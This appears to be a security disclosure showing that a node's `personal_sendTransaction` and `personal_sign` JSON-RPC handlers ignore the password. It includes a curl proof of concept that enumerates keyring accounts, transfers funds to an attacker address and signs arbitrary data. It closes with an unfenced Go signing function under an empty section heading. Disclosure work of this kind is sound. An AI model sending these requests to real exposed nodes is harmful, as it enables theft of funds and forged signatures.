### Title
Password Parameter Silently Discarded in `personal_sendTransaction` and `personal_sign` — Unauthenticated Signing of Node-Managed Accounts - (File: rpc/namespaces/ethereum/personal/api.go)

### Summary

The `personal_sendTransaction` and `personal_sign` JSON-RPC handlers accept a `password` parameter per the Ethereum `personal_*` API specification, but both handlers silently discard it. When the `personal` namespace is enabled, any caller who can reach the JSON-RPC port can sign and broadcast transactions — or sign arbitrary data — from any address held in the node's keyring, without supplying the correct password.

### Finding Description

### Impact Explanation

When the `personal` namespace is enabled and the JSON-RPC port is reachable:

1. **Unauthorized fund transfer**: Any caller can invoke `personal_sendTransaction` with an arbitrary empty or wrong password and transfer EVM-denom funds from any address in the node's keyring to an attacker-controlled address. The signed transaction passes all ante-handler checks (valid signature, correct nonce, sufficient balance) and is committed on-chain.

2. **Arbitrary message signing**: Any caller can invoke `personal_sign` to obtain a valid secp256k1 signature over attacker-chosen data from any node-managed key. This signature can be replayed in EIP-712 or other off-chain authorization flows.

Both outcomes map directly to the allowed High impact: *"Ethereum transaction … signer verification bypass enabling … unauthorized account/code mutation"* and *"Public JSON-RPC … path … exposes a reachable route to the impacts above."*

### Likelihood Explanation

- The `personal` namespace is explicitly documented and available; operators enabling it for wallet-management workflows (common in testnet/staging deployments) are directly exposed.
- No special privileges are required: a single unauthenticated HTTP POST to the JSON-RPC port suffices.
- The node's keyring is necessarily accessible while the node is running, so `SignByAddress` will succeed.
- The attack requires only knowledge of an address in the keyring, which is trivially obtained via `eth_accounts` or `personal_listAccounts`.

### Recommendation

1. **Forward the password to the keyring**: Pass the `password` argument through to `Keyring.SignByAddress` (or an equivalent passphrase-gated signing call) so that the keyring backend can enforce decryption-time authentication.
2. **Implement `UnlockAccount`**: Maintain a time-bounded in-memory set of unlocked addresses; reject `SendTransaction` and `Sign` calls for addresses that have not been explicitly unlocked with the correct password.
3. **Reject calls when password is empty**: At minimum, return an error when the password argument is the empty string, matching geth's behavior.
4. **Document the risk**: Add a prominent warning that enabling the `personal` namespace without network-level access controls exposes signing capabilities to any reachable caller.

### Proof of Concept

Assuming the node is running with `--json-rpc.api eth,personal` and `0xADDR` is a key in the node's keyring:

```bash
# Step 1: enumerate node-managed addresses (no auth required)
curl -s -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: {"result":["0xADDR",...]}

# Step 2: send funds from 0xADDR to attacker — wrong/empty password accepted
curl -s -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","method":"personal_sendTransaction",
    "params":[{"from":"0xADDR","to":"0xATTACKER","value":"0xDE0B6B3A7640000"},"WRONG_PASSWORD"],
    "id":2
  }'
# Returns a valid tx hash; funds are transferred on-chain.

# Step 3: sign arbitrary data — wrong/empty password accepted
curl -s -X POST http://localhost:8545 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0","method":"personal_sign",
    "params":["0xdeadbeef","0xADDR","WRONG_PASSWORD"],
    "id":3
  }'
# Returns a valid 65-byte secp256k1 signature.
```

The password `"WRONG_PASSWORD"` (or `""`) is silently discarded at `rpc/namespaces/ethereum/personal/api.go:131` and `145`; the keyring signs unconditionally because the node's in-process keyring is already loaded.

func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
	from := sdk.AccAddress(address.Bytes())

	_, err := b.clientCtx.Keyring.KeyByAddress(from)
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", address.String())
		return nil, fmt.Errorf("%s; %s", keystore.ErrNoMatch, err.Error())
	}

	// Apply EIP-191 signed-message prefix to domain-separate personal
	// signatures from transaction signatures (matching Geth's eth_sign).
	signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), signingtypes.SignMode_SIGN_MODE_TEXTUAL)
	if err != nil {
		b.logger.Error("keyring.SignByAddress failed", "address", address.Hex())
		return nil, err
	}

	signature[crypto.RecoveryIDOffset] += 27 // Transform V from 0/1 to 27/28 according to the yellow paper
	return signature, nil
}
